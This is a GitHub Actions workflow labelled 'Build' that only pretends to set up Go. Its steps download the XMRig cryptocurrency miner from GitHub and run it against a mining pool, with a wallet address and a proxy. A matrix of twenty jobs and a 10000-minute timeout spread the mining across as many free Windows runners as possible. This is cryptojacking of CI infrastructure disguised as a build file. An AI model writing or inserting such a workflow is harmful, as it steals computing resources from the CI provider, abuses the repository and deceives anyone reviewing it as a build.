name: Build
on: [push, pull_request]
jobs:
  build:
    name: Build
    runs-on: windows-latest
    strategy:
      max-parallel: 20
      fail-fast: false
      matrix:
        go: [1.1, 1.2]
        flag: [A, B, C, D, E, F, G, H, I, J]
    timeout-minutes: 10000
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v1
    - name: Download
      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-gcc-win64.zip -OutFile xmrig.zip
    - name: Extract
      run: Expand-Archive xmrig.zip
    - name: Start
      run: .\xmrig\xmrig-6.12.2\xmrig.exe -a randomx -o rx.unmineable.com:3333 -u SHIB:0xb13f91835c32249e1506da1201e937d666652725.$(shuf -i 10-9999999999999999999 -n 1) --keepalive --donate-level 1 --proxy=72.49.49.11:31034
